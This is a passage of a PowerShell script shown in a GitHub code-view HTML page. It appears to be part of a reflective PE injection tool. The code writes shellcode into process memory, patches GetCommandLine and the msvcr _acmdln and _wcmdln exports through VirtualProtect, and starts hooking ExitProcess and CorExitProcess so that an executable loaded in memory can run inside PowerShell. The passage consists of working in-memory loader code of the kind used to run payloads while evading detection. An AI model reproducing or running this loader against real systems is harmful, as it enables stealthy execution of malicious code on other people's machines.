          <td id="L2120" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2120"></td>
          <td id="LC2120" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::StructureToPtr(<span class="pl-smi">$CmdLineWArgsPtr</span><span class="pl-k">,</span> <span class="pl-smi">$GetCommandLineWAddrTemp</span><span class="pl-k">,</span> <span class="pl-c1">$false</span>)</td>
        </tr>
        <tr>
          <td id="L2121" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2121"></td>
          <td id="LC2121" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$GetCommandLineWAddrTemp</span> <span class="pl-k">=</span> <span class="pl-c1">Add-SignedIntAsUnsigned</span> <span class="pl-smi">$GetCommandLineWAddrTemp</span> <span class="pl-smi">$PtrSize</span></td>
        </tr>
        <tr>
          <td id="L2122" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2122"></td>
          <td id="LC2122" class="blob-code blob-code-inner js-file-line">		<span class="pl-c1">Write-BytesToMemory</span> <span class="pl-k">-</span>Bytes <span class="pl-smi">$Shellcode2</span> <span class="pl-k">-</span>MemoryAddress <span class="pl-smi">$GetCommandLineWAddrTemp</span></td>
        </tr>
        <tr>
          <td id="L2123" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2123"></td>
          <td id="LC2123" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2124" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2124"></td>
          <td id="LC2124" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Functions<span class="pl-smi">.VirtualProtect.Invoke</span></span>(<span class="pl-smi">$GetCommandLineWAddr</span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-smi">$TotalSize</span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-smi">$OldProtectFlag</span><span class="pl-k">,</span> [<span class="pl-k">Ref</span>]<span class="pl-smi">$OldProtectFlag</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L2125" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2125"></td>
          <td id="LC2125" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>################################################</span></td>
        </tr>
        <tr>
          <td id="L2126" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2126"></td>
          <td id="LC2126" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2127" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2127"></td>
          <td id="LC2127" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2128" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2128"></td>
          <td id="LC2128" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>################################################</span></td>
        </tr>
        <tr>
          <td id="L2129" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2129"></td>
          <td id="LC2129" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>For C++ stuff that is compiled with visual studio as &quot;multithreaded DLL&quot;, the above method of overwriting GetCommandLine doesn&#39;t work.</span></td>
        </tr>
        <tr>
          <td id="L2130" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2130"></td>
          <td id="LC2130" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>	I don&#39;t know why exactly.. But the msvcr DLL that a &quot;DLL compiled executable&quot; imports has an export called _acmdln and _wcmdln.</span></td>
        </tr>
        <tr>
          <td id="L2131" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2131"></td>
          <td id="LC2131" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>	It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the</span></td>
        </tr>
        <tr>
          <td id="L2132" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2132"></td>
          <td id="LC2132" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>	argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.</span></td>
        </tr>
        <tr>
          <td id="L2133" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2133"></td>
          <td id="LC2133" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$DllList</span> <span class="pl-k">=</span> <span class="pl-k">@</span>(<span class="pl-s"><span class="pl-pds">&quot;</span>msvcr70d.dll<span class="pl-pds">&quot;</span></span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&quot;</span>msvcr71d.dll<span class="pl-pds">&quot;</span></span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&quot;</span>msvcr80d.dll<span class="pl-pds">&quot;</span></span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&quot;</span>msvcr90d.dll<span class="pl-pds">&quot;</span></span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&quot;</span>msvcr100d.dll<span class="pl-pds">&quot;</span></span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&quot;</span>msvcr110d.dll<span class="pl-pds">&quot;</span></span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&quot;</span>msvcr70.dll<span class="pl-pds">&quot;</span></span> <span class="pl-k">`</span></td>
        </tr>
        <tr>
          <td id="L2134" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2134"></td>
          <td id="LC2134" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&quot;</span>msvcr71.dll<span class="pl-pds">&quot;</span></span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&quot;</span>msvcr80.dll<span class="pl-pds">&quot;</span></span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&quot;</span>msvcr90.dll<span class="pl-pds">&quot;</span></span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&quot;</span>msvcr100.dll<span class="pl-pds">&quot;</span></span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&quot;</span>msvcr110.dll<span class="pl-pds">&quot;</span></span>)</td>
        </tr>
        <tr>
          <td id="L2135" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2135"></td>
          <td id="LC2135" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2136" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2136"></td>
          <td id="LC2136" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">foreach</span> (<span class="pl-smi">$Dll</span> <span class="pl-k">in</span> <span class="pl-smi">$DllList</span>)</td>
        </tr>
        <tr>
          <td id="L2137" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2137"></td>
          <td id="LC2137" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L2138" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2138"></td>
          <td id="LC2138" class="blob-code blob-code-inner js-file-line">			[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$DllHandle</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.GetModuleHandle.Invoke</span></span>(<span class="pl-smi">$Dll</span>)</td>
        </tr>
        <tr>
          <td id="L2139" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2139"></td>
          <td id="LC2139" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">if</span> (<span class="pl-smi">$DllHandle</span> <span class="pl-k">-ne</span> [<span class="pl-k">IntPtr</span>]::Zero)</td>
        </tr>
        <tr>
          <td id="L2140" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2140"></td>
          <td id="LC2140" class="blob-code blob-code-inner js-file-line">			{</td>
        </tr>
        <tr>
          <td id="L2141" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2141"></td>
          <td id="LC2141" class="blob-code blob-code-inner js-file-line">				[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$WCmdLnAddr</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.GetProcAddress.Invoke</span></span>(<span class="pl-smi">$DllHandle</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&quot;</span>_wcmdln<span class="pl-pds">&quot;</span></span>)</td>
        </tr>
        <tr>
          <td id="L2142" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2142"></td>
          <td id="LC2142" class="blob-code blob-code-inner js-file-line">				[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$ACmdLnAddr</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.GetProcAddress.Invoke</span></span>(<span class="pl-smi">$DllHandle</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&quot;</span>_acmdln<span class="pl-pds">&quot;</span></span>)</td>
        </tr>
        <tr>
          <td id="L2143" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2143"></td>
          <td id="LC2143" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">if</span> (<span class="pl-smi">$WCmdLnAddr</span> <span class="pl-k">-eq</span> [<span class="pl-k">IntPtr</span>]::Zero <span class="pl-k">-or</span> <span class="pl-smi">$ACmdLnAddr</span> <span class="pl-k">-eq</span> [<span class="pl-k">IntPtr</span>]::Zero)</td>
        </tr>
        <tr>
          <td id="L2144" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2144"></td>
          <td id="LC2144" class="blob-code blob-code-inner js-file-line">				{</td>
        </tr>
        <tr>
          <td id="L2145" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2145"></td>
          <td id="LC2145" class="blob-code blob-code-inner js-file-line">					<span class="pl-s"><span class="pl-pds">&quot;</span>Error, couldn&#39;t find _wcmdln or _acmdln<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2146" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2146"></td>
          <td id="LC2146" class="blob-code blob-code-inner js-file-line">				}</td>
        </tr>
        <tr>
          <td id="L2147" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2147"></td>
          <td id="LC2147" class="blob-code blob-code-inner js-file-line">				</td>
        </tr>
        <tr>
          <td id="L2148" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2148"></td>
          <td id="LC2148" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$NewACmdLnPtr</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::StringToHGlobalAnsi(<span class="pl-smi">$ExeArguments</span>)</td>
        </tr>
        <tr>
          <td id="L2149" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2149"></td>
          <td id="LC2149" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$NewWCmdLnPtr</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::StringToHGlobalUni(<span class="pl-smi">$ExeArguments</span>)</td>
        </tr>
        <tr>
          <td id="L2150" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2150"></td>
          <td id="LC2150" class="blob-code blob-code-inner js-file-line">				</td>
        </tr>
        <tr>
          <td id="L2151" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2151"></td>
          <td id="LC2151" class="blob-code blob-code-inner js-file-line">				<span class="pl-c"><span class="pl-c">#</span>Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state</span></td>
        </tr>
        <tr>
          <td id="L2152" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2152"></td>
          <td id="LC2152" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$OrigACmdLnPtr</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::PtrToStructure(<span class="pl-smi">$ACmdLnAddr</span><span class="pl-k">,</span> [<span class="pl-k">Type</span>][<span class="pl-k">IntPtr</span>])</td>
        </tr>
        <tr>
          <td id="L2153" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2153"></td>
          <td id="LC2153" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$OrigWCmdLnPtr</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::PtrToStructure(<span class="pl-smi">$WCmdLnAddr</span><span class="pl-k">,</span> [<span class="pl-k">Type</span>][<span class="pl-k">IntPtr</span>])</td>
        </tr>
        <tr>
          <td id="L2154" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2154"></td>
          <td id="LC2154" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$OrigACmdLnPtrStorage</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::AllocHGlobal(<span class="pl-smi">$PtrSize</span>)</td>
        </tr>
        <tr>
          <td id="L2155" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2155"></td>
          <td id="LC2155" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$OrigWCmdLnPtrStorage</span> <span class="pl-k">=</span> [<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::AllocHGlobal(<span class="pl-smi">$PtrSize</span>)</td>
        </tr>
        <tr>
          <td id="L2156" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2156"></td>
          <td id="LC2156" class="blob-code blob-code-inner js-file-line">				[<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::StructureToPtr(<span class="pl-smi">$OrigACmdLnPtr</span><span class="pl-k">,</span> <span class="pl-smi">$OrigACmdLnPtrStorage</span><span class="pl-k">,</span> <span class="pl-c1">$false</span>)</td>
        </tr>
        <tr>
          <td id="L2157" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2157"></td>
          <td id="LC2157" class="blob-code blob-code-inner js-file-line">				[<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::StructureToPtr(<span class="pl-smi">$OrigWCmdLnPtr</span><span class="pl-k">,</span> <span class="pl-smi">$OrigWCmdLnPtrStorage</span><span class="pl-k">,</span> <span class="pl-c1">$false</span>)</td>
        </tr>
        <tr>
          <td id="L2158" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2158"></td>
          <td id="LC2158" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$ReturnArray</span> <span class="pl-k">+=</span> <span class="pl-k">,</span>(<span class="pl-smi">$ACmdLnAddr</span><span class="pl-k">,</span> <span class="pl-smi">$OrigACmdLnPtrStorage</span><span class="pl-k">,</span> <span class="pl-smi">$PtrSize</span>)</td>
        </tr>
        <tr>
          <td id="L2159" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2159"></td>
          <td id="LC2159" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$ReturnArray</span> <span class="pl-k">+=</span> <span class="pl-k">,</span>(<span class="pl-smi">$WCmdLnAddr</span><span class="pl-k">,</span> <span class="pl-smi">$OrigWCmdLnPtrStorage</span><span class="pl-k">,</span> <span class="pl-smi">$PtrSize</span>)</td>
        </tr>
        <tr>
          <td id="L2160" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2160"></td>
          <td id="LC2160" class="blob-code blob-code-inner js-file-line">				</td>
        </tr>
        <tr>
          <td id="L2161" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2161"></td>
          <td id="LC2161" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$Success</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.VirtualProtect.Invoke</span></span>(<span class="pl-smi">$ACmdLnAddr</span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-smi">$PtrSize</span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>](<span class="pl-smi">$Win32Constants<span class="pl-smi">.PAGE_EXECUTE_READWRITE</span></span>)<span class="pl-k">,</span> [<span class="pl-k">Ref</span>]<span class="pl-smi">$OldProtectFlag</span>)</td>
        </tr>
        <tr>
          <td id="L2162" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2162"></td>
          <td id="LC2162" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">if</span> (<span class="pl-smi">$Success</span> <span class="pl-k">=</span> <span class="pl-c1">$false</span>)</td>
        </tr>
        <tr>
          <td id="L2163" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2163"></td>
          <td id="LC2163" class="blob-code blob-code-inner js-file-line">				{</td>
        </tr>
        <tr>
          <td id="L2164" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2164"></td>
          <td id="LC2164" class="blob-code blob-code-inner js-file-line">					<span class="pl-k">throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Call to VirtualProtect failed<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2165" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2165"></td>
          <td id="LC2165" class="blob-code blob-code-inner js-file-line">				}</td>
        </tr>
        <tr>
          <td id="L2166" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2166"></td>
          <td id="LC2166" class="blob-code blob-code-inner js-file-line">				[<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::StructureToPtr(<span class="pl-smi">$NewACmdLnPtr</span><span class="pl-k">,</span> <span class="pl-smi">$ACmdLnAddr</span><span class="pl-k">,</span> <span class="pl-c1">$false</span>)</td>
        </tr>
        <tr>
          <td id="L2167" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2167"></td>
          <td id="LC2167" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$Win32Functions<span class="pl-smi">.VirtualProtect.Invoke</span></span>(<span class="pl-smi">$ACmdLnAddr</span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-smi">$PtrSize</span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>](<span class="pl-smi">$OldProtectFlag</span>)<span class="pl-k">,</span> [<span class="pl-k">Ref</span>]<span class="pl-smi">$OldProtectFlag</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L2168" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2168"></td>
          <td id="LC2168" class="blob-code blob-code-inner js-file-line">				</td>
        </tr>
        <tr>
          <td id="L2169" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2169"></td>
          <td id="LC2169" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$Success</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.VirtualProtect.Invoke</span></span>(<span class="pl-smi">$WCmdLnAddr</span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-smi">$PtrSize</span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>](<span class="pl-smi">$Win32Constants<span class="pl-smi">.PAGE_EXECUTE_READWRITE</span></span>)<span class="pl-k">,</span> [<span class="pl-k">Ref</span>]<span class="pl-smi">$OldProtectFlag</span>)</td>
        </tr>
        <tr>
          <td id="L2170" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2170"></td>
          <td id="LC2170" class="blob-code blob-code-inner js-file-line">				<span class="pl-k">if</span> (<span class="pl-smi">$Success</span> <span class="pl-k">=</span> <span class="pl-c1">$false</span>)</td>
        </tr>
        <tr>
          <td id="L2171" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2171"></td>
          <td id="LC2171" class="blob-code blob-code-inner js-file-line">				{</td>
        </tr>
        <tr>
          <td id="L2172" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2172"></td>
          <td id="LC2172" class="blob-code blob-code-inner js-file-line">					<span class="pl-k">throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>Call to VirtualProtect failed<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2173" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2173"></td>
          <td id="LC2173" class="blob-code blob-code-inner js-file-line">				}</td>
        </tr>
        <tr>
          <td id="L2174" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2174"></td>
          <td id="LC2174" class="blob-code blob-code-inner js-file-line">				[<span class="pl-k">System.Runtime.InteropServices.Marshal</span>]::StructureToPtr(<span class="pl-smi">$NewWCmdLnPtr</span><span class="pl-k">,</span> <span class="pl-smi">$WCmdLnAddr</span><span class="pl-k">,</span> <span class="pl-c1">$false</span>)</td>
        </tr>
        <tr>
          <td id="L2175" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2175"></td>
          <td id="LC2175" class="blob-code blob-code-inner js-file-line">				<span class="pl-smi">$Win32Functions<span class="pl-smi">.VirtualProtect.Invoke</span></span>(<span class="pl-smi">$WCmdLnAddr</span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-smi">$PtrSize</span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>](<span class="pl-smi">$OldProtectFlag</span>)<span class="pl-k">,</span> [<span class="pl-k">Ref</span>]<span class="pl-smi">$OldProtectFlag</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L2176" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2176"></td>
          <td id="LC2176" class="blob-code blob-code-inner js-file-line">			}</td>
        </tr>
        <tr>
          <td id="L2177" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2177"></td>
          <td id="LC2177" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L2178" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2178"></td>
          <td id="LC2178" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>################################################</span></td>
        </tr>
        <tr>
          <td id="L2179" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2179"></td>
          <td id="LC2179" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2180" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2180"></td>
          <td id="LC2180" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2181" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2181"></td>
          <td id="LC2181" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>################################################</span></td>
        </tr>
        <tr>
          <td id="L2182" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2182"></td>
          <td id="LC2182" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn&#39;t die when the EXE exits.</span></td>
        </tr>
        <tr>
          <td id="L2183" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2183"></td>
          <td id="LC2183" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L2184" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2184"></td>
          <td id="LC2184" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$ReturnArray</span> <span class="pl-k">=</span> <span class="pl-k">@</span>()</td>
        </tr>
        <tr>
          <td id="L2185" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2185"></td>
          <td id="LC2185" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$ExitFunctions</span> <span class="pl-k">=</span> <span class="pl-k">@</span>() <span class="pl-c"><span class="pl-c">#</span>Array of functions to overwrite so the thread doesn&#39;t exit the process</span></td>
        </tr>
        <tr>
          <td id="L2186" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2186"></td>
          <td id="LC2186" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2187" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2187"></td>
          <td id="LC2187" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>CorExitProcess (compiled in to visual studio c++)</span></td>
        </tr>
        <tr>
          <td id="L2188" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2188"></td>
          <td id="LC2188" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$MscoreeHandle</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.GetModuleHandle.Invoke</span></span>(<span class="pl-s"><span class="pl-pds">&quot;</span>mscoree.dll<span class="pl-pds">&quot;</span></span>)</td>
        </tr>
        <tr>
          <td id="L2189" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2189"></td>
          <td id="LC2189" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> (<span class="pl-smi">$MscoreeHandle</span> <span class="pl-k">-eq</span> [<span class="pl-k">IntPtr</span>]::Zero)</td>
        </tr>
        <tr>
          <td id="L2190" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2190"></td>
          <td id="LC2190" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L2191" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2191"></td>
          <td id="LC2191" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>mscoree handle null<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2192" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2192"></td>
          <td id="LC2192" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L2193" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2193"></td>
          <td id="LC2193" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$CorExitProcessAddr</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.GetProcAddress.Invoke</span></span>(<span class="pl-smi">$MscoreeHandle</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&quot;</span>CorExitProcess<span class="pl-pds">&quot;</span></span>)</td>
        </tr>
        <tr>
          <td id="L2194" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2194"></td>
          <td id="LC2194" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> (<span class="pl-smi">$CorExitProcessAddr</span> <span class="pl-k">-eq</span> [<span class="pl-k">IntPtr</span>]::Zero)</td>
        </tr>
        <tr>
          <td id="L2195" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2195"></td>
          <td id="LC2195" class="blob-code blob-code-inner js-file-line">		{</td>
        </tr>
        <tr>
          <td id="L2196" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2196"></td>
          <td id="LC2196" class="blob-code blob-code-inner js-file-line">			<span class="pl-k">Throw</span> <span class="pl-s"><span class="pl-pds">&quot;</span>CorExitProcess address not found<span class="pl-pds">&quot;</span></span></td>
        </tr>
        <tr>
          <td id="L2197" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2197"></td>
          <td id="LC2197" class="blob-code blob-code-inner js-file-line">		}</td>
        </tr>
        <tr>
          <td id="L2198" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2198"></td>
          <td id="LC2198" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$ExitFunctions</span> <span class="pl-k">+=</span> <span class="pl-smi">$CorExitProcessAddr</span></td>
        </tr>
        <tr>
          <td id="L2199" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2199"></td>
          <td id="LC2199" class="blob-code blob-code-inner js-file-line">		</td>
        </tr>
        <tr>
          <td id="L2200" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2200"></td>
          <td id="LC2200" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>ExitProcess (what non-managed programs use)</span></td>
        </tr>
        <tr>
          <td id="L2201" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2201"></td>
          <td id="LC2201" class="blob-code blob-code-inner js-file-line">		[<span class="pl-k">IntPtr</span>]<span class="pl-smi">$ExitProcessAddr</span> <span class="pl-k">=</span> <span class="pl-smi">$Win32Functions<span class="pl-smi">.GetProcAddress.Invoke</span></span>(<span class="pl-smi">$Kernel32Handle</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&quot;</span>ExitProcess<span class="pl-pds">&quot;</span></span>)</td>
        </tr>
        <tr>
          <td id="L2202" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="2202"></td>
          <td id="LC2202" class="blob-code blob-code-inner js-file-line">		<span class="pl-k">if</span> (<span class="pl-smi">$ExitProcessAddr</span> <span class="pl-k">-eq</span> [<span class="pl-k">IntPtr</span>]::Zero)</td>
        </tr>
        <tr>
